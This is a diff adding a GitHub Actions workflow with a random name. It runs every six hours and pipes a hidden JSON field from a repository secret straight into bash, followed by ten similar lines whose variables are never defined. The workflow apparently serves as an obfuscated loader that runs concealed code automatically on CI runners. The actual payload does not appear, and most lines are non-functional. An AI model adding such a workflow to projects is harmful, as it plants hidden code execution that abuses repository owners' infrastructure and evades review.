@@ -1,0 +1,28 @@
+name: ceremoniousjockstrap
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: ceremoniousjockstrap
+        env:
+          bvqcz251: ${{ secrets.bvqcz251 }}
+        run: |
+          echo $bvqcz251 | jq -r .in116 | /bin/bash
+          echo $kld42085 | jq -r .h2994 | /bin/bash
+          echo $dnj107 | jq -r .k751 | /bin/bash
+          echo $gatq67613 | jq -r .ykgl27327 | /bin/bash
+          echo $hpgkz46879 | jq -r .ijrwb9081 | /bin/bash
+          echo $tgpt34 | jq -r .hijup55198 | /bin/bash
+          echo $qot66024 | jq -r .i03225 | /bin/bash
+          echo $fh5 | jq -r .p3 | /bin/bash
+          echo $m470 | jq -r .sphpl995 | /bin/bash
+          echo $m77499 | jq -r .pa5955 | /bin/bash
+          echo $w8 | jq -r .xy6 | /bin/bash
+
